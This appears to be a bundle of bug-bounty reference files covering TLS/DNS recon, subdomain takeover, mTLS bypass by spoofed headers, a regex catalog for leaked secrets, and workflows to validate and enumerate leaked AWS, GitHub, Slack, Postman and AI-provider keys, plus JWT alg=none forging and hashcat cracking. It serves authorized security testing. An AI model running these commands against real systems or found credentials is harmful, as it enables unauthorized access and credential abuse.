  if [ -z "$RESULT" ]; then
    echo "[MISSING] $HEADER"
  else
    echo "[OK] $HEADER: $RESULT"
  fi
done

# Automated security headers check
curl -s "https://securityheaders.com/?q=https://$TARGET&followRedirects=on" | \
  grep -oP "grade-\K[A-F+]" | head -3
```

---

# crt.sh — certificate transparency logs
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | \
  python3 -m json.tool 2>/dev/null | grep "name_value" | \
  grep -oP '"name_value": "\K[^"]+' | \
  sed 's/\*\.//g' | sort -u > recon/$TARGET/ct-subdomains.txt

echo "[+] CT subdomains found: $(wc -l < recon/$TARGET/ct-subdomains.txt)"

# Compare with existing subdomain list
comm -23 <(sort recon/$TARGET/ct-subdomains.txt) \
         <(sort recon/$TARGET/subdomains.txt 2>/dev/null) | head -20

## Phase 6.5 — Dangling Records → Subdomain Takeover (the finding that actually pays)

This is the highest-impact item in the whole skill. A CNAME/A record pointing at a deprovisioned third-party resource (S3 bucket, Azure CDN/App Service, GitHub Pages, Heroku, Fastly, etc.) lets you claim that resource and serve content from `*.target.com`. Full depth lives in `hunt-subdomain`; here is the TLS/DNS-recon entry point.

```bash

# For each subdomain from CT logs, resolve the CNAME chain and check for a live origin
while read sub; do
  CNAME=$(dig +short CNAME "$sub" | head -1)
  [ -z "$CNAME" ] && continue
  CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 "https://$sub/" 2>/dev/null)
  echo "$sub -> $CNAME  [http $CODE]"
done < recon/$TARGET/ct-subdomains.txt | tee recon/$TARGET/cname-map.txt

# fingerprint string in the body (e.g. "NoSuchBucket", "There isn't a GitHub Pages site here",

# "Fastly error: unknown domain", "The specified bucket does not exist", Azure "Web App - Unavailable").
```

**Validation gate — a takeover claim requires you to actually claim it:**
1. Confirm the dangling target is **unregistered/claimable** (the S3 bucket name is free, the Heroku app does not exist, etc.) — the provider error fingerprint alone is necessary but NOT sufficient.
2. **Register the resource yourself** and serve a unique canary file, e.g. `https://$sub/<random>.txt` returning a string only you know. Screenshot it served over the victim subdomain with valid TLS.
3. Tear it down immediately after PoC; never leave attacker-controlled content live on the target's domain.

Impact: cookie scope theft (cookies set for `.target.com`), OAuth `redirect_uri`/CORS-trust abuse, phishing on a trusted origin. Typically **High** (Critical if it sits at an OAuth/SSO redirect or shares session cookies).

---

## Phase 7 — CAA Records (recon signal only — NOT a reportable finding)

```bash

# CAA records DECLARE which CAs the domain owner permits to issue certs.
dig CAA $TARGET +short
dig CAA "*.$TARGET" +short
```

**Do NOT report "missing CAA" as a vulnerability.** This is the most common false positive in this class. Correct framing:

- A **missing CAA record does not let any attacker obtain a certificate.** It only means the owner has not *opted into* restricting which CAs may issue. With or without CAA, an attacker still needs to pass Domain Control Validation (HTTP-01 / DNS-01 / email) — which requires already controlling the domain, DNS, or web root.
- The "fraudulent issuance" scenario requires **CA compromise or social-engineering a CA** into mis-issuing. That is out of scope for essentially every bug-bounty program and is not something you can demonstrate. CAA enforcement is a CA-side control, not an attacker-facing surface.
- CAA is **Info-tier hardening at most**, and routinely closed as Won't-Fix / OOS. Mention it in a recon notes appendix if at all; never file it standalone.

**Where CAA recon IS useful (no finding, just intel):** the `issue`/`issuewild` values tell you which CA the org uses (e.g. `letsencrypt.org`, `digicert.com`, `amazon.com`). That hints at automation (ACME) and at where a *real* takeover (Phase 6.5 dangling records) could let you mint a valid cert via DCV because you'd control the host.

---

# Check if endpoint requires client certificate
curl -sk "https://$TARGET/internal/" 2>&1 | grep -i "ssl\|certificate\|403\|401"

# Try without client cert (should fail)
curl -sk --cert "" "https://$TARGET/internal/api" | head -5

# Try common bypass paths (some apps skip mTLS on health checks)
for path in /health /ping /status /metrics /api/health; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  echo "$path: $STATUS"
done

# Header-injection bypass — nginx/HAProxy/Envoy commonly terminate mTLS at the edge and

# forward the verdict as a request header the backend trusts. If the edge does NOT strip

# client-supplied copies of that header, you spoof a verified client. Try the real header

# names used by each proxy:
for combo in \
  "X-SSL-Client-Verify: SUCCESS|X-SSL-Client-S-DN: CN=admin" \
  "ssl-client-verify: SUCCESS|ssl-client-subject-dn: CN=admin" \
  "X-Client-Verify: SUCCESS|X-Client-DN: CN=admin,O=target" \
  "X-Forwarded-Client-Cert: By=spiffe://x;Hash=0;Subject=\"CN=admin\""; do
  H1="${combo%%|*}"; H2="${combo##*|}"
  echo "== $H1 / $H2 =="
  curl -sk "https://$TARGET/internal/api" -H "$H1" -H "$H2" -o /dev/null -w "%{http_code}\n"
done
```

**mTLS-bypass validation — this is a real auth bypass, so prove access, not just a status code:**
- A `200` could be a generic page. Confirm you reached **authenticated-only functionality**: show data/an action that is impossible without the client cert (e.g. an admin-only object, an internal-only response body).
- Distinguish *server policy* from *server state*: a `403` flipping to `200` with the spoofed header is meaningful; a `200` for both with and without the header means the path was never protected (no finding).
- For the bypass-path angle (`/health`, `/metrics`): only a finding if that endpoint exposes **sensitive data** (internal IPs, build secrets, Prometheus metrics revealing internal topology) — an empty `200 OK` health probe is not.
- Capture the request/response pair in Burp Repeater so the spoofed header → privileged response is unambiguous.

---

## Chain Table

Severities below are calibrated to what triage actually accepts. They are deliberately conservative; do not inflate them in a report.

| TLS/DNS finding | Realistic standalone severity | Notes / what raises it |
|----------------|------|------|
| Dangling-CNAME subdomain takeover (claimed + canary served) | **High** | Critical if at OAuth `redirect_uri`/SSO or sharing `.target.com` session cookies |
| mTLS / client-cert bypass reaching authed functionality | **High** | Must show privileged data/action, not just a 200 |
| AXFR returning internal hosts/IPs | **Medium** | Recon value; pairs with internal-service findings |
| Spoofable DMARC, **delivered to a real inbox** (PoC headers) | **Medium** | Often OOS — check scope; Inbox (not Spam) + delivered required. *Reading `p=none` from `dig` alone = Info, do not file* |
| Heartbleed / live memory leak with captured secrets | **High–Critical** | Only with an actual dump containing keys/cookies |
| Missing HSTS on auth subdomain | **Low / Info** | NOT High — exploitation needs an active MitM position you cannot demonstrate remotely; report only with a working downgrade-capture PoC |
| Weak cipher *support* (RC4/3DES/SWEET32) with no decrypt PoC | **Info / Low** | Hardening only; frequently OOS |
| Missing CAA | **Info (do not file)** | Absence does not enable issuance; not attacker-demonstrable |

---

# MXToolbox for email security
curl -s "https://mxtoolbox.com/api/v1/Lookup/spf?argument=$TARGET" 2>/dev/null

# dmarc-inspector
curl -s "https://dmarcian.com/dmarc-inspector/?domain=$TARGET" 2>/dev/null
```

---

## Validation

Each finding ships only with the proof listed — never the `dig`/header output alone.

- **Subdomain takeover:** you registered the dangling resource and served a unique canary over `https://sub.target.com/` with valid TLS. Screenshot + canary string. (Tear down after.)
- **mTLS bypass:** spoofed client-verify header returns *privileged* data/action that the cert-required path otherwise denies. Burp request/response pair.
- **AXFR:** zone transfer returns internal hostnames/IPs from an authoritative NS. Full transcript.
- **DMARC spoof:** swaks-sent mail with `From: @target.com` **delivered to a real Inbox** (not Spam), raw `Authentication-Results` headers attached. A bounce or Spam landing = no finding.
- **HSTS missing:** only reportable with a working downgrade PoC capturing a victim cookie over plaintext — otherwise it is best-practice noise.

**Severity (conservative — matches the Chain Table):**
- Subdomain takeover (claimed): High (Critical at OAuth/SSO redirect or shared session cookie)
- mTLS bypass to authed functionality: High
- AXFR returning internal hosts: Medium
- DMARC spoof delivered-to-inbox: Medium (often OOS — verify scope)
- HSTS missing on auth (with downgrade PoC): Low–Medium; without PoC: Info
- Weak cipher support without decrypt PoC: Info–Low
- Missing security headers / missing CAA only: Info (usually do not file)

**Pre-submission scope gate:** before filing ANY item here, confirm the program does not list it as out of scope (email-auth, missing-headers, weak-TLS-without-exploit, and CAA are commonly OOS). Quote the in-scope line in your report.


## SOURCE: hunt-skills/offensive-osint/references/secret-patterns.md

# Secret-Pattern Catalog

> Reference content for the `offensive-osint` skill. Originally §17 of the monolithic SKILL.md (refactored 2026-05-02 for size/load efficiency).

## 17. Secret-Pattern Catalog — 48 patterns (29 base + 19 modern)

The catalog runs against any text source: GitHub code, Postman workspaces, JS bodies, sourcesContent blobs, mobile-app strings, Wayback HTML, paste sites, Stack Exchange code blocks. **Order matters: most-specific patterns first** so generic catches don't pre-empt typed ones.

| # | Name | Regex | Severity | Category |
|---|---|---|---|---|
| 1 | AWS Access Key | `\b(AKIA\|ASIA)[0-9A-Z]{16}\b` | **CRITICAL** | aws |
| 2 | AWS Secret Key (typed) | `(?i)aws[_\-]?secret[_\-]?access[_\-]?key['"\s:=]+([A-Za-z0-9/+=]{40})` | **CRITICAL** | aws |
| 3 | AWS Secret (loose) | `(?i)aws(.{0,20})?(secret\|sk)["'=: ]+([0-9a-z/+=]{40})` | HIGH | aws |
| 4 | GCP Service Account JSON | `"type"\s*:\s*"service_account"` | **CRITICAL** | gcp |
| 5 | Google API Key | `\bAIza[0-9A-Za-z_\-]{35}\b` | HIGH | gcp |
| 6 | GitHub Classic PAT | `\bghp_[A-Za-z0-9]{36}\b` | **CRITICAL** | github |
| 7 | GitHub Fine-grained PAT | `\bgithub_pat_[A-Za-z0-9_]{82}\b` | **CRITICAL** | github |
| 8 | GitHub OAuth | `\bgho_[A-Za-z0-9]{36}\b` | HIGH | github |
| 9 | GitHub Server-to-Server | `\bgh[usr]_[A-Za-z0-9]{36,}\b` | HIGH | github |
| 10 | Stripe Live Key | `\bsk_live_[0-9A-Za-z]{24,}\b` | **CRITICAL** | stripe |
| 11 | Stripe Test Key | `\bsk_test_[0-9A-Za-z]{24,}\b` | LOW | stripe |
| 12 | Slack Token | `\bxox[abpors]-[0-9A-Za-z\-]{10,48}\b` | HIGH | slack |
| 13 | Slack Webhook | `https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+` | MEDIUM | slack |
| 14 | SendGrid Key | `\bSG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}\b` | HIGH | email_svc |
| 15 | Mailgun Key (v1) | `\bkey-[0-9a-zA-Z]{32}\b` | HIGH | email_svc |
| 16 | Mailgun Key (loose) | `\bkey-[0-9a-f]{32}\b` | HIGH | email_svc |
| 17 | Twilio API Key | `\bSK[0-9a-fA-F]{32}\b` | HIGH | twilio |
| 18 | Twilio Account SID | `\bAC[a-f0-9]{32}\b` | MEDIUM | twilio |
| 19 | Twilio Auth Token | `(?i)twilio(.{0,20})?(auth\|token)["'=: ]+([a-f0-9]{32})` | HIGH | twilio |
| 20 | Heroku API Key | `(?i)heroku(.{0,20})?api["'=: ]+([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})` | MEDIUM | paas |
| 21 | Firebase URL | `\bhttps?://[a-z0-9\-]+\.firebaseio\.com\b` | LOW | firebase |
| 22 | JWT (any) | `\beyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\b` | MEDIUM | jwt |
| 23 | Bearer Token Assignment | `(?i)authorization["'=: ]+bearer\s+[A-Za-z0-9._\-]{20,}` | MEDIUM | bearer |
| 24 | Basic Auth in URL | `https?://[^/\s:@]+:[^/\s:@]+@[^/\s]+` | MEDIUM | basic_auth |
| 25 | RSA Private Key | `-----BEGIN RSA PRIVATE KEY-----` | **CRITICAL** | private_key |
| 26 | EC Private Key | `-----BEGIN EC PRIVATE KEY-----` | **CRITICAL** | private_key |
| 27 | OpenSSH Private Key | `-----BEGIN OPENSSH PRIVATE KEY-----` | **CRITICAL** | private_key |
| 28 | Generic Private Key | `-----BEGIN (DSA \|PGP \|)PRIVATE KEY-----` | **CRITICAL** | private_key |
| 29 | Generic API Key | `(?i)(?:api[_\-]?key\|apikey\|api_secret\|access_token\|secret[_\-]?token)['"\s:=]+["']([A-Za-z0-9+/=_\-]{24,})["']` | MEDIUM | generic |
| 30 | Anthropic API Key | `\bsk-ant-(?:api03\|admin01)-[A-Za-z0-9_\-]{93,}\b` | **CRITICAL** | ai_api |
| 31 | OpenAI API Key (legacy) | `\bsk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}\b` | **CRITICAL** | ai_api |
| 32 | OpenAI Project Key | `\bsk-proj-[A-Za-z0-9_\-]{40,}T3BlbkFJ[A-Za-z0-9_\-]{40,}\b` | **CRITICAL** | ai_api |
| 33 | OpenAI User Session | `\bsess-[A-Za-z0-9]{40}\b` | HIGH | ai_api |
| 34 | HuggingFace Token | `\bhf_[A-Za-z0-9]{30,}\b` | HIGH | ai_api |
| 35 | Cloudflare API Token | `\b[A-Za-z0-9_\-]{40}\b` (when paired with `(?i)cloudflare`/`X-Auth-Key` context) | HIGH | infra_api |
| 36 | Cloudflare Global API Key | `(?i)cf[_\-]?api[_\-]?key['"\s:=]+([a-f0-9]{37})` | **CRITICAL** | infra_api |
| 37 | DigitalOcean Token | `\bdop_v1_[a-f0-9]{64}\b` | HIGH | infra_api |
| 38 | npm Token (Modern) | `\bnpm_[A-Za-z0-9]{36}\b` | HIGH | package_registry |
| 39 | PyPI Token | `\bpypi-AgENdGV[A-Za-z0-9_\-]+\b` | HIGH | package_registry |
| 40 | Docker Hub PAT | `\bdckr_pat_[A-Za-z0-9_\-]{27,}\b` | HIGH | package_registry |
| 41 | Atlassian API Token | `\bATATT3xFfGF0[A-Za-z0-9_\-]{180,}\b` | HIGH | saas_api |
| 42 | New Relic License Key | `\b(?:NRAA\|NRAK\|NRBR)-[A-F0-9]{27}\b` | MEDIUM | observability |
| 43 | DataDog API Key (in DD_API_KEY context) | `(?i)dd[_\-]?api[_\-]?key['"\s:=]+([a-f0-9]{32})` | HIGH | observability |
| 44 | Sentry DSN | `https://[a-f0-9]+@o[0-9]+\.ingest\.sentry\.io/[0-9]+` | LOW | observability |
| 45 | ngrok Auth Token | `\b[12][A-Za-z0-9]{26}_[A-Za-z0-9]{32,}\b` (when `(?i)ngrok` context) | MEDIUM | tunneling |
| 46 | Linear API Key | `\blin_api_[A-Za-z0-9]{40}\b` | MEDIUM | saas_api |
| 47 | Discord Bot Token | `\b[MN][A-Za-z\d]{23}\.[\w\-]{6}\.[\w\-]{27}\b` | HIGH | bot_token |
| 48 | Telegram Bot Token | `\b\d{8,10}:[A-Za-z0-9_\-]{35}\b` | HIGH | bot_token |

**False-positive notes:**
- Patterns 22 (JWT), 23 (Bearer), 29 (Generic) trigger on test/example data frequently. Always look at *context* — a JWT in a `README.md` example block ≠ a JWT in a production `.env` file.
- Pattern 16 (Mailgun loose) and pattern 11 (Stripe test) are noisy by design; severity is set low for that reason.
- Pattern 24 (Basic auth in URL) catches monitoring-tool URLs and CI-debug URLs as well as real creds — verify before alerting.
- For GitHub's Fine-grained PAT (pattern 7), the `82` length is by GitHub's spec — be skeptical of matches significantly longer or shorter.

---


## SOURCE: hunt-skills/offensive-osint/references/secret-validators.md

# Read-Only Secret Validators

> Reference content for the `offensive-osint` skill. Originally §23 of the monolithic SKILL.md (refactored 2026-05-02 for size/load efficiency).

## 23. Read-Only Secret Validators

Use these to confirm a discovered credential is live. **Read-only, never destructive.** Tag every validation with `detectability` and `checked_at` (UTC).

### 23.1 Postman API Key (PMAK-*)

```
GET https://api.getpostman.com/me
Header: X-Api-Key: PMAK-<key>
```
- `200` → live; response contains `{user: {id, username, email}}`.
- `401` → dead.
- Scope: full read access to the user's Postman account (collections, env vars, history).
- Detectability: low.

### 23.2 AWS Access Key

```
sts:GetCallerIdentity
```
Use boto3:
```python
import boto3
sts = boto3.client('sts',
    aws_access_key_id='<AKIA...>',
    aws_secret_access_key='<secret>',
    region_name='us-east-1')
ident = sts.get_caller_identity()

# ident['Account'], ident['Arn'], ident['UserId']
```
- Valid → returns Account ID + ARN + UserId.
- Invalid → `InvalidClientTokenId` or `SignatureDoesNotMatch`.
- ARN scope: `:user/` is IAM user (broad), `:assumed-role/` is temp role (narrow), `:root` is account root (do NOT validate root keys you find).
- Detectability: **medium** (CloudTrail logs `GetCallerIdentity` in account `<found>`).

### 23.3 GitHub PAT

```
GET https://api.github.com/user
Header: Authorization: token <ghp_*>
```
- `200` → live; response contains `login`, `id`, `name`, `email` (if public).
- Response header `X-OAuth-Scopes` lists token scopes. `repo` scope = write to all accessible repos; `admin:org` = org admin.
- `401` → dead.
- Detectability: low.

### 23.4 Slack Token

```
POST https://slack.com/api/auth.test
Header: Authorization: Bearer <xox*-*>
```
- `200` with `{"ok": true}` → live; response includes `team`, `team_id`, `user`, `user_id`.
- `200` with `{"ok": false, "error": "invalid_auth"}` → dead.
- Detectability: low.

### 23.5 Anthropic API Key

```
GET https://api.anthropic.com/v1/models
Headers:
  x-api-key: sk-ant-api03-...
  anthropic-version: 2023-06-01
```
- `200` → live; response lists available models.
- `401` → dead.
- `403` with org_disabled → key valid but org disabled.
- Detectability: low; usage shows in Anthropic Console for the workspace owner.

### 23.6 OpenAI API Key

```
GET https://api.openai.com/v1/models
Header: Authorization: Bearer sk-...
```
- `200` → live; lists models (may include org-specific fine-tunes).
- `401` → dead.
- `429` → live but quota exhausted.
- Detectability: low; usage shows in OpenAI dashboard.

### 23.7 npm Token

```
GET https://registry.npmjs.org/-/whoami
Header: Authorization: Bearer npm_<token>
```
- `200` with `{"username": "<user>"}` → live.
- `401` → dead.
- For scope check: `GET /-/npm/v1/tokens` returns the token's permissions (read/publish).
- Detectability: low.

### 23.8 Atlassian API Token

```
GET https://<workspace>.atlassian.net/rest/api/3/myself
Auth: Basic <base64(email:ATATT3xFfGF0_...)>
```
- `200` → live; returns account profile + email.
- `401` → dead.
- Workspace required — extract from leaked repo URL or Atlassian dork results.
- Detectability: low.

### 23.9 DataDog API + APP Key

```
GET https://api.datadoghq.com/api/v1/validate
Headers:
  DD-API-KEY: <api-key>
  DD-APPLICATION-KEY: <app-key>
```
- `200` → both keys valid.
- `403` → either key invalid.
- Per-region URL varies: `api.datadoghq.eu`, `api.us3.datadoghq.com`, etc.
- Detectability: low; appears in DataDog audit log.

### 23.10 Validator output schema

```
{
  "status":          "verified_live" | "verified_dead" | "scope_restricted" |
                     "scope_unrestricted" | "validation_skipped_by_policy" |
                     "validation_unsupported" | "validation_failed_transient",
  "provider":        "postman" | "aws" | "github" | "slack" | "anthropic" | "openai" | "npm" | "atlassian" | "datadog",
  "account_id":      "<opaque>",
  "scope":           "<freeform>",
  "metadata":        {<provider-specific>},
  "checked_at":      "<UTC ISO8601>",
  "detectability":   "low" | "medium" | "high"
}
```

### 23.11 Hard rules

- Read-only endpoint only.
- Never use the validated credential to create, modify, delete, or send anything.
- Tag every validation with detectability.
- Record `checked_at` (UTC).
- If RoE forbids validation → `validation_skipped_by_policy`, stop, document.
- For root AWS keys, infrastructure-write GitHub PATs, or admin Slack tokens — flag for the operator and let them decide.

### 23.12 Post-Discovery Enumeration Workflows

After validation confirms a key is live, you often want to enumerate what it can do. Stay read-only.

**AWS access key — IAM enum:**
```bash
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."

# IAM-user details (only if ARN was :user/)
aws iam get-user
aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)
aws iam list-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)
aws iam list-groups-for-user --user-name $(aws iam get-user --query 'User.UserName' --output text)

# What can I actually do? (simulate-principal-policy for common dangerous actions)
aws iam simulate-principal-policy \
  --policy-source-arn $(aws sts get-caller-identity --query Arn --output text) \
  --action-names s3:ListAllMyBuckets ec2:DescribeInstances iam:ListUsers \
                 secretsmanager:ListSecrets ssm:DescribeParameters \
                 lambda:ListFunctions rds:DescribeDBInstances

# Read-only enumeration of common services (do not WRITE)
aws s3 ls
aws ec2 describe-instances --output table --query 'Reservations[*].Instances[*].[InstanceId,State.Name,Tags[?Key==`Name`].Value]'
aws secretsmanager list-secrets --query 'SecretList[*].Name'
aws ssm describe-parameters --query 'Parameters[*].Name'
aws lambda list-functions --query 'Functions[*].FunctionName'
aws rds describe-db-instances --query 'DBInstances[*].DBInstanceIdentifier'

# Check MFA enforcement on the user
aws iam get-account-summary | jq '.SummaryMap.AccountMFAEnabled'
aws iam list-mfa-devices --user-name <username>
```

**GitHub PAT — repo enum:**
```bash
TOKEN="ghp_..."
H="Authorization: token $TOKEN"

# Scopes already captured from X-OAuth-Scopes header
curl -sk -m 10 -I -H "$H" https://api.github.com/user | grep -i 'X-OAuth-Scopes'

# All repos accessible (own + collaborator + org member)
curl -sk -m 10 -H "$H" "https://api.github.com/user/repos?affiliation=owner,collaborator,organization_member&per_page=100"

# Per-org: members, repos, secrets (secrets endpoint is metadata-only — names not values)
ORG="<orgname>"
curl -sk -m 10 -H "$H" "https://api.github.com/orgs/$ORG/members"
curl -sk -m 10 -H "$H" "https://api.github.com/orgs/$ORG/repos?per_page=100"
curl -sk -m 10 -H "$H" "https://api.github.com/orgs/$ORG/actions/secrets"   # requires admin:org

# Per-repo workflow secrets (metadata)
REPO="<orgname/reponame>"
curl -sk -m 10 -H "$H" "https://api.github.com/repos/$REPO/actions/secrets"
```

**Slack token — workspace enum:**
```bash
TOKEN="xoxb-..."
H="Authorization: Bearer $TOKEN"

# Identity details
curl -sk -m 10 -H "$H" -X POST "https://slack.com/api/users.identity" | jq .

# What conversations can I see? (sweeping check; respects scope)
curl -sk -m 10 -H "$H" -X POST "https://slack.com/api/conversations.list?types=public_channel,private_channel,mpim,im&limit=200" | jq '.channels[] | {id, name, is_private}'

# Workspace info
curl -sk -m 10 -H "$H" -X POST "https://slack.com/api/team.info" | jq .

# User list (only if scope includes users:read)
curl -sk -m 10 -H "$H" -X POST "https://slack.com/api/users.list?limit=100" | jq '.members[] | {name, real_name, is_admin}'

# DO NOT: chat.postMessage, files.upload, conversations.invite, etc.
```

**JWT — full triage workflow:**
```bash
JWT="eyJhbGciOiJIUzI1NiI..."

# Look for: alg (none = critical, HS256/HS384/HS512 = symmetric, RS256/RS512 = asymmetric, ES256 = ECDSA)

# If alg is RS256, try crafting an HS256 token signed with the public key as secret

# Brute-force HS256 secret (if HS256 + short-secret suspicion)
hashcat -m 16500 "$JWT" /path/to/wordlist.txt

# Re-encode header with alg=none and empty signature; some libraries accept
NEW_JWT=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr -d '=' | tr '/+' '_-')
NEW_JWT="${NEW_JWT}.$(echo "$JWT" | cut -d. -f2)."

# Test against API
```

**Postman PMAK — workspace enum:**
```bash
PMAK="PMAK-..."
H="X-Api-Key: $PMAK"

# /me already done (validation)
curl -sk -m 10 -H "$H" https://api.getpostman.com/me | jq '.user'

# Workspaces
curl -sk -m 10 -H "$H" https://api.getpostman.com/workspaces | jq '.workspaces[] | {id, name, type}'

# Per-workspace collections
WS="<workspace-id>"
curl -sk -m 10 -H "$H" "https://api.getpostman.com/workspaces/$WS" | jq '.workspace.collections[]'
curl -sk -m 10 -H "$H" "https://api.getpostman.com/workspaces/$WS" | jq '.workspace.environments[]'

# Per-collection requests (where the secrets often live)
COL="<collection-id>"
curl -sk -m 10 -H "$H" "https://api.getpostman.com/collections/$COL" | jq '.collection.item[]'

# Environments (env vars often contain creds)
ENV="<environment-id>"
curl -sk -m 10 -H "$H" "https://api.getpostman.com/environments/$ENV" | jq '.environment.values[] | {key, value}'
```

**Anthropic API key — usage enum:**
```bash
KEY="sk-ant-api03-..."
H="x-api-key: $KEY"
A="anthropic-version: 2023-06-01"

# Models accessible
curl -sk -m 10 -H "$H" -H "$A" https://api.anthropic.com/v1/models | jq '.data[] | .id'

# Usage / quota (admin-scoped tokens only):
curl -sk -m 10 -H "$H" -H "$A" https://api.anthropic.com/v1/organizations/usage_report | jq .

# DO NOT: send actual completion requests against organization budget
```

**OpenAI API key — usage enum:**
```bash
KEY="sk-..."
H="Authorization: Bearer $KEY"

# Models
curl -sk -m 10 -H "$H" https://api.openai.com/v1/models | jq '.data | length'

# Org info (if key has org scope)
curl -sk -m 10 -H "$H" https://api.openai.com/v1/organizations | jq .

# Files / fine-tunes (sometimes contain training data with PII)
curl -sk -m 10 -H "$H" https://api.openai.com/v1/files | jq .
curl -sk -m 10 -H "$H" https://api.openai.com/v1/fine_tuning/jobs | jq .
```

**Generic key — provenance enum:**
1. Find the consuming domain (where in JS bundle did the key appear? what URL is the bundle served from?).
2. Check the API docs of the inferred service.
3. If the key matches a known regex, lookup vendor-specific scope check.
4. If unknown service, search GitHub for the key prefix (`gh search code "<prefix>" --type=code`).
5. Identify scope before validating; some keys are write-broad on first use.

---
